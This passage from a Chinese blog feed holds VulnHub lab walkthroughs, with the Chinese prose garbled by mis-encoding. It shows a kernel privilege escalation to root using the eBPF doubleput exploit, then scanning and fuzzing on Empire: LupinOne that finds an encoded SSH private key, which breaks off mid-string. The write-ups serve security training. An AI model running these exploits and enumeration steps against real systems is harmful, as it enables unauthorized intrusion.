class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unzip 39772.zip</span><br>Archive:  39772.zip<br>   creating: 39772/<br>  inflating: 39772/.DS_Store         <br>   creating: __MACOSX/<br>   creating: __MACOSX/39772/<br>  inflating: __MACOSX/39772/._.DS_Store  <br>  inflating: 39772/crasher.tar       <br>  inflating: __MACOSX/39772/._crasher.tar  <br>  inflating: 39772/exploit.tar       <br>  inflating: __MACOSX/39772/._exploit.tar  <br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>39772<br>39772.zip<br>__MACOSX<br>systemd-private-3fa2825cd4ff47fbb6b4b797e59e4504-systemd-timesyncd.service-oDSbXI<br>vmware-root<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> 39772</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>crasher.tar<br>exploit.tar<br><span class="hljs-meta">$</span><span class="bash"> tar -xvf exploit.tar</span><br>ebpf_mapfd_doubleput_exploit/<br>ebpf_mapfd_doubleput_exploit/hello.c<br>ebpf_mapfd_doubleput_exploit/suidhelper.c<br>ebpf_mapfd_doubleput_exploit/compile.sh<br>ebpf_mapfd_doubleput_exploit/doubleput.c<br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>crasher.tar<br>ebpf_mapfd_doubleput_exploit<br>exploit.tar<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l</span>       <br>total 20<br>-rwxr-x--- 1 www-data www-data  155 Apr 26  2016 compile.sh<br>-rw-r----- 1 www-data www-data 4188 Apr 26  2016 doubleput.c<br>-rw-r----- 1 www-data www-data 2186 Apr 26  2016 hello.c<br>-rw-r----- 1 www-data www-data  255 Apr 26  2016 suidhelper.c<br></code></pre></td></tr></table></figure><p> æ‰§è¡Œç¼–è¯‘å’Œåˆ©ç”¨è„šæœ¬ï¼ŒæˆåŠŸå¾—åˆ° rootï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./compile.sh</span><br>doubleput.c: In function &#x27;make_setuid&#x27;:<br>doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]<br>    .insns = (__aligned_u64) insns,<br>             ^<br>doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]<br>    .license = (__aligned_u64)&quot;&quot;<br>               ^<br><span class="hljs-meta">$</span><span class="bash"> ls -l</span><br>total 52<br>-rwxr-x--- 1 www-data www-data   155 Apr 26  2016 compile.sh<br>-rwxrwxrwx 1 www-data www-data 12336 Jul  4 17:54 doubleput<br>-rw-r----- 1 www-data www-data  4188 Apr 26  2016 doubleput.c<br>-rwxrwxrwx 1 www-data www-data  8028 Jul  4 17:54 hello<br>-rw-r----- 1 www-data www-data  2186 Apr 26  2016 hello.c<br>-rwxrwxrwx 1 www-data www-data  7524 Jul  4 17:54 suidhelper<br>-rw-r----- 1 www-data www-data   255 Apr 26  2016 suidhelper.c<br><span class="hljs-meta">$</span><span class="bash"> ./doubleput</span><br>starting writev<br>woohoo, got pointer reuse<br>writev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.<br>suid file detected, launching rootshell...<br>we have root privs now...<br>whoami<br>root<br>id<br>uid=0(root) gid=0(root) groups=0(root),33(www-data)<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€ç«¯å£æ‰«æã€ç›®å½•æ‰«æ</p><p>2ã€joomla CMSï¼šjoomscan æ‰«æã€sqlmap æ³¨å…¥</p><p>3ã€åå°ç™»å½•ã€åå¼¹shellä¸Šä¼ </p><p>4ã€å†…æ ¸ææƒ</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empireï¼šLupinOne</title>
    <link href="/2022/07/02/Penetration/Vulnhub/Part-1/0x10%20Empire-LupinOne/"/>
    <url>/2022/07/02/Penetration/Vulnhub/Part-1/0x10%20Empire-LupinOne/</url>
    
    <content type="html"><![CDATA[<h1 id="0x10-Empire-LupinOne-vulnhub"><a href="#0x10-Empire-LupinOne-vulnhub" class="headerlink" title="0x10 Empire: LupinOne~vulnhub"></a>0x10 Empire: LupinOne~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/empire-lupinone,750/">Empire: LupinOne ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.152</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.152</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>ç«¯å£æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.152</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-02 03:01 EDT<br>Nmap scan report for 192.168.135.152<br>Host is up (0.00068s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)<br>|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)<br>|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)<br>80/tcp open  http    Apache httpd 2.4.48 ((Debian))<br>| http-robots.txt: 1 disallowed entry <br>|_/~myfiles<br>|_http-server-header: Apache/2.4.48 (Debian)<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>MAC Address: 00:0C:29:4A:EB:9B (VMware)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.68 ms 192.168.135.152<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 23.04 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 8.4p1 Debian 5 (protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.48 ((Debian))</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>22ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ ssh</p><p><strong>80ç«¯å£</strong></p><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;!-- Its an easy box, dont give up. --&gt;<br></code></pre></td></tr></table></figure><p>è¿›è¡Œç›®å½•çˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.152:80</span><br><br>-----------------<br>URL_BASE: http://192.168.135.152:80/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>-----------------<br>                                                    <br>---- Scanning URL: http://192.168.135.152:80/ ----<br>==&gt; DIRECTORY: http://192.168.135.152:80/image/<br>+ http://192.168.135.152:80/index.html (CODE:200|SIZE:333)<br>==&gt; DIRECTORY: http://192.168.135.152:80/javascript/<br>==&gt; DIRECTORY: http://192.168.135.152:80/manual/<br>+ http://192.168.135.152:80/robots.txt (CODE:200|SIZE:34)<br>+ http://192.168.135.152:80/server-status (CODE:403|SIZE:280)  <br></code></pre></td></tr></table></figure><p>å¾—åˆ° robots.txtï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/~myfiles<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.135.152/~myfiles/</code> ï¼Œä¸º Error 404 ï¼ŒæŸ¥çœ‹æºç ï¼Œå¾—åˆ°æç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;!-- Your can do it, keep trying. --&gt;<br></code></pre></td></tr></table></figure><p>æ¢å·¥å…·è¿›è¡Œæ‰«æï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.152</span>     <br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.152</span><br><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.152 -w /usr/share/wordlists/dirb/common.txt -q -n -e</span><br></code></pre></td></tr></table></figure><p>æ— ç»“æœï¼Œä½¿ç”¨ ffuf æ‰«æï¼š</p><blockquote><p><a href="https://blog.csdn.net/u010062917/article/details/120473487">Ffufä½¿ç”¨æ•™ç¨‹_WeUjieçš„åšå®¢-CSDNåšå®¢</a><br><a href="https://www.freebuf.com/sectool/203316.html">ffufï¼šGoè¯­è¨€ç¼–å†™çš„é«˜é€ŸWeb Fuzzer - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ffuf -c -w /usr/share/wordlists/dirb/common.txt -u <span class="hljs-string">&#x27;http://192.168.135.152/~FUZZ&#x27;</span></span><br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://192.168.135.152/~FUZZ<br> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200,204,301,302,307,401,403,405<br>________________________________________________<br><br>secret                  [Status: 301, Size: 320, Words: 20, Lines: 10]<br>:: Progress: [4614/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wfuzz -c -u <span class="hljs-string">&#x27;http://192.168.135.152/~FUZZ&#x27;</span> --hc 404 -w /usr/share/wordlists/dirb/common.txt</span><br>********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://192.168.135.152/~FUZZ<br>Total requests: 4614<br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload<br>=====================================================================<br>000003537:   301        9 L      28 W       320 Ch      &quot;secret&quot;<br><br>Total time: 4.177629<br>Processed Requests: 4614<br>Filtered Requests: 4613<br>Requests/sec.: 1104.453<br></code></pre></td></tr></table></figure><p>å‘ç° secret ï¼Œè®¿é—® <code>http://192.168.135.152/~secret</code> ï¼Œå¾—åˆ°æç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,<br>Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.<br>I&#x27;m smart I know that.<br>Any problem let me know<br>Your best friend icex64<br></code></pre></td></tr></table></figure><p>ä¸€å…±å¯ä»¥å¾—åˆ°ä¸‰ä¸ªä¿¡æ¯ï¼Œç”¨æˆ·åå¯èƒ½æ˜¯ icex64 ï¼Œå­˜åœ¨ä¸€ä¸ª ssh private key file ï¼Œå¯ä»¥ç”¨ fasttrack ç ´è§£ ã€‚</p><p>ç”¨ ffuf å¯»æ‰¾ç§é’¥ï¼š</p><blockquote><p>ç”±äºç§é’¥æ–‡ä»¶ä¸€èˆ¬æ”¾åœ¨ .ssh æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰€ä»¥æŒ‰ç…§ â€œ.FUZZâ€ çš„æ€è·¯æšä¸¾ï¼Œåˆå› ä¸ºæ˜¯æ–‡ä»¶ï¼Œæ•…æ·»åŠ åç¼€</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ffuf -c -w /usr/share/wordlists/dirb/common.txt -u <span class="hljs-string">&#x27;http://192.168.135.152/~secret/.FUZZ&#x27;</span> -<span class="hljs-built_in">fc</span> 403 -e .txt,.html,.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u <span class="hljs-string">&#x27;http://192.168.135.152/~secret/.FUZZ&#x27;</span> -<span class="hljs-built_in">fc</span> 403 -e .txt</span><br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://192.168.135.152/~secret/.FUZZ<br> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<br> :: Extensions       : .txt <br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200,204,301,302,307,401,403,405<br> :: Filter           : Response status: 403<br>________________________________________________<br><br>mysecret.txt            [Status: 200, Size: 4689, Words: 1, Lines: 2]<br>:: Progress: [175328/175328] :: Job [1/1] :: 9583 req/sec :: Duration: [0:00:18] :: Errors: 0 ::<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hc 404,403 -u http://192.168.135.152/~secret/.FUZZ.txt</span><br><br>Target: http://192.168.135.152/~secret/.FUZZ.txt<br>Total requests: 220560<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload<br>=====================================================================<br>[......]<br>000073703:   200        1 L      1 W        4689 Ch     &quot;mysecret&quot;<br><br>Total time: 0<br>Processed Requests: 220560<br>Filtered Requests: 220546<br>Requests/sec.: 0<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 http://192.168.135.152/~secret/.FUZZ</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 http://192.168.135.152/~secret/.FUZ2ZFUZZ</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°æ–‡ä»¶ mysecret.txt ï¼Œè®¿é—® <code>http://192.168.135.152/~secret/.mysecret.txt</code> ï¼Œçœ‹èµ·æ¥åƒæ˜¯ base64åŠ å¯†ï¼š</p><blockquote><p><a href="https://www.dcode.fr/cipher-identifier">https://www.dcode.fr/cipher-identifier</a></p></blockquote><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">cGxD<span class="hljs-number">6</span>K<span class="hljs-symbol">NZQddY6</span>iCsSuqPzUdqSx<span class="hljs-number">4</span>F<span class="hljs-number">5</span>ohDY<span class="hljs-symbol">nArU3</span>kw<span class="hljs-number">5</span>dmvTURqcaTr<span class="hljs-symbol">ncHC3</span><span class="hljs-symbol">NLKBqFM2</span>ywr<span class="hljs-symbol">NbRTW3</span>eTpUvEz<span class="hljs-number">9</span>qFuB<span class="hljs-symbol">nyhAK8</span>TWu<span class="hljs-number">9</span>cFxLoscWUrc<span class="hljs-number">4</span>rLcRafiVvxPRpP<span class="hljs-number">692</span>Bw<span class="hljs-number">5</span>bshu<span class="hljs-number">6</span>ZZpixzJWv<span class="hljs-symbol">NZhPEoQoJRx7</span>jU<span class="hljs-symbol">nupsEhcCgjuXD7</span>B<span class="hljs-symbol">N1</span>TMZGL<span class="hljs-number">2</span><span class="hljs-symbol">nUxcDQwahUC1</span>u<span class="hljs-number">6</span><span class="hljs-symbol">NLSK81</span>Yh<span class="hljs-number">9</span>Lk<span class="hljs-symbol">ND67</span>WD<span class="hljs-number">87</span>Ud<span class="hljs-number">2</span>JpdUwjMossSeHEbvYjCEYB<span class="hljs-symbol">nKRPpDhSgL7</span>jmTzxmtZxS<span class="hljs-number">9</span>wX<span class="hljs-number">6</span>D<span class="hljs-symbol">NLmQBsNT936</span>L<span class="hljs-number">6</span>VwYdEPKuLeY<span class="hljs-number">6</span>wuyYmffQYZEVXhDtK<span class="hljs-number">6</span>pokmA<span class="hljs-number">3</span>J<span class="hljs-meta">o2</span>Q<span class="hljs-number">83</span>cVok<span class="hljs-number">6</span>x<span class="hljs-number">74</span><span class="hljs-name">M5</span>DA<span class="hljs-number">1</span>TdjKvEsVGLvRMkkDpshztiGCaDu<span class="hljs-number">4</span>uceLw<span class="hljs-number">3</span>iLYv<span class="hljs-symbol">NVZK75</span>k<span class="hljs-number">9</span>zK<span class="hljs-number">9</span>E<span class="hljs-number">2</span>qcdwP<span class="hljs-number">7</span>yWugahC<span class="hljs-symbol">n5</span>HyoaooLeBDiCAojj<span class="hljs-number">4</span>JUxafQUcmfocvugz<span class="hljs-symbol">n81</span>GAJ<span class="hljs-number">8</span>LdxQjosS<span class="hljs-number">1</span>tHmriYtwp<span class="hljs-number">8</span>pGf<span class="hljs-number">4</span><span class="hljs-symbol">Nfq5</span>FjqmGAdvA<span class="hljs-number">2</span>ZPMUAVWVHgkeSVE<span class="hljs-symbol">nooKT8</span>sxGUfZxg<span class="hljs-symbol">nHAfER49</span><span class="hljs-symbol">nZnz1</span>YgcFkR<span class="hljs-number">73</span>rWfP<span class="hljs-number">5</span><span class="hljs-symbol">NwEpsCgeCWYSYh3</span>XeF<span class="hljs-number">3</span>dUqBBpf<span class="hljs-number">6</span>xMJ<span class="hljs-symbol">nS7</span>wmZa<span class="hljs-number">9</span>oWZVd<span class="hljs-number">8</span>Rxs<span class="hljs-number">1</span>zrXawVKSLxardUEfRLh<span class="hljs-number">6</span>us<span class="hljs-symbol">nUmMMAnSmTyuvMTnjK2</span>vzTBbd<span class="hljs-number">5</span>djvhJKaY<span class="hljs-number">2</span>szXFetZdWBsRFhUwReUk<span class="hljs-number">7</span>DkhmCPb<span class="hljs-number">2</span>mQ<span class="hljs-symbol">NoTSuRpnfUG8</span>CWaD<span class="hljs-number">3</span>L<span class="hljs-number">2</span>Q<span class="hljs-number">9</span>UHepvrs<span class="hljs-number">67</span>YGZJWwk<span class="hljs-number">54</span>rmT<span class="hljs-number">6</span>v<span class="hljs-number">1</span>pHHLDR<span class="hljs-number">8</span>gBC<span class="hljs-number">9</span>ZTfdDtzBaZ<span class="hljs-meta">o8</span>sesPQVbuKA<span class="hljs-number">9</span>VE<span class="hljs-attr">Vsgw1</span>xVvRyRZz<span class="hljs-number">8</span>JH<span class="hljs-number">6</span>DEzqrE<span class="hljs-symbol">neoibQUdJxLVNTMXpYXGi68</span>RA<span class="hljs-number">4</span>V<span class="hljs-number">1</span>pa<span class="hljs-number">5</span>yaj<span class="hljs-number">2</span>UQ<span class="hljs-number">6</span>xRpF<span class="hljs-number">6</span>otrWTerjwAL<span class="hljs-symbol">N67</span>preSWWH<span class="hljs-number">4</span>vY<span class="hljs-number">3</span>MBv<span class="hljs-number">9</span>Cu<span class="hljs-number">6358</span>KWe<span class="hljs-attr">VC1</span>YZAXvBRwoZPXtquY<span class="hljs-number">9</span>EiFL<span class="hljs-number">6</span>i<span class="hljs-number">3</span>KXFe<span class="hljs-number">3</span>Y<span class="hljs-number">7</span>W<span class="hljs-number">4</span>Li<span class="hljs-number">7</span>jF<span class="hljs-number">8</span>vFrK<span class="hljs-number">6</span>woYGy<span class="hljs-number">8</span>soJJYEbXQp<span class="hljs-number">2</span><span class="hljs-symbol">NWqaJNcCQX8</span>umkiGf<span class="hljs-symbol">NFNiRoTfQmz29</span>wBZFJPtPJ<span class="hljs-number">98</span>UkQwKJfSW<span class="hljs-number">9</span>XKvDJwduMRWey<span class="hljs-number">2</span>j<span class="hljs-number">61</span>yaH<span class="hljs-number">4</span>ij<span class="hljs-number">5</span>uZQXDs<span class="hljs-number">37</span>F<span class="hljs-symbol">NV7</span>TBj<span class="hljs-number">71</span>GGFGEh<span class="hljs-number">8</span><span class="hljs-attr">vSKP2</span>g<span class="hljs-name">g5</span><span class="hljs-symbol">nLcACbkzF4</span>zjqdikP<span class="hljs-number">3</span>TF<span class="hljs-symbol">NWGnij5</span>az<span class="hljs-number">3</span>Axve<span class="hljs-symbol">N3</span>EUF<span class="hljs-symbol">nuDtfB4</span>ADRt<span class="hljs-number">57</span>UokLMDi<span class="hljs-number">1</span>V<span class="hljs-number">73</span>Pt<span class="hljs-number">5</span>PQe<span class="hljs-number">8</span><span class="hljs-name">g8</span>SLjuvt<span class="hljs-symbol">NYpo8</span>AqyC<span class="hljs-number">3</span>zTMSmP<span class="hljs-number">8</span>dFQgoborCXEMJz<span class="hljs-number">6</span><span class="hljs-symbol">npX6</span>QhgXqpbhS<span class="hljs-number">58</span>yVRhpW<span class="hljs-number">21</span><span class="hljs-symbol">Nz4</span>xFkDL<span class="hljs-number">8</span>QFCVH<span class="hljs-number">2</span>beL<span class="hljs-number">1</span>PZxEghmdVdY<span class="hljs-number">9</span><span class="hljs-symbol">N3</span>pVrMBUS<span class="hljs-number">7</span>Mz<span class="hljs-symbol">nYasCruXqWVE55</span>RPuSPrMEcRLoCa<span class="hljs-number">1</span>XbYt<span class="hljs-name">G5</span>JxqfbE<span class="hljs-name">g2</span>aw<span class="hljs-number">8</span>BdMirLLWhuxb<span class="hljs-name">m3</span>hxrr<span class="hljs-number">9</span>ZizxDDyu<span class="hljs-number">3</span>i<span class="hljs-number">1</span>PLkpHgQw<span class="hljs-number">3</span>zH<span class="hljs-number">4</span>GTK<span class="hljs-number">2</span>mb<span class="hljs-number">5</span>fxuu<span class="hljs-number">9</span>W<span class="hljs-number">6</span><span class="hljs-symbol">nGWW24</span>wjGbxHW<span class="hljs-number">6</span>aT<span class="hljs-symbol">neLweh74</span>jFWKzfSLgEVyc<span class="hljs-number">7</span>RyAS<span class="hljs-number">7</span>Qkwkud<span class="hljs-number">9</span>ozyBxxsV<span class="hljs-number">4</span>VEdf<span class="hljs-number">8</span>mW<span class="hljs-number">5</span><span class="hljs-name">g3</span><span class="hljs-symbol">nTDyKE69</span>P<span class="hljs-number">34</span>SkpQgDV<span class="hljs-symbol">NKJvDfJvZbL8</span><span class="hljs-meta">o6</span>BfPjEPi<span class="hljs-number">125</span>edV<span class="hljs-number">9</span>JbCy<span class="hljs-symbol">NRFKKpTxpq7</span>QSruk<span class="hljs-number">7</span>L<span class="hljs-number">5</span>LEX<span class="hljs-name">G8</span>H<span class="hljs-number">4</span>rsLyv<span class="hljs-number">6</span>djUT<span class="hljs-number">9</span><span class="hljs-symbol">nJGWQKRPi3</span>Bugawd<span class="hljs-number">7</span>ixMUYoRMhagBmGY<span class="hljs-symbol">Nafi4</span>JBapacTMw<span class="hljs-name">G95</span>wPyZT<span class="hljs-number">8</span>Mz<span class="hljs-number">6</span>gALq<span class="hljs-number">5</span>Vmr<span class="hljs-number">8</span>tkk<span class="hljs-number">9</span>ry<span class="hljs-number">4</span>Ph<span class="hljs-number">4</span>U<span class="hljs-number">2</span>Erihv<span class="hljs-symbol">NiFQVS7</span>U<span class="hljs-number">9</span>XBwQHc<span class="hljs-number">6</span>fhrDHz<span class="hljs-number">2</span>objdeDGvuVHzPgqMeRMZtjzaLBZ<span class="hljs-number">2</span>wDLeJUKEjaJAH<span class="hljs-symbol">nFLxs1</span>xWXU<span class="hljs-number">7</span>V<span class="hljs-number">4</span>gigRAtiMFB<span class="hljs-number">5</span>bjFTc<span class="hljs-number">7</span>owzKHcqP<span class="hljs-number">8</span><span class="hljs-symbol">nJrXou8</span>VJqFQDMD<span class="hljs-number">3</span>PJcLjdErZGUS<span class="hljs-number">7</span>oauaa<span class="hljs-number">3</span>xhyx<span class="hljs-number">8</span>Ar<span 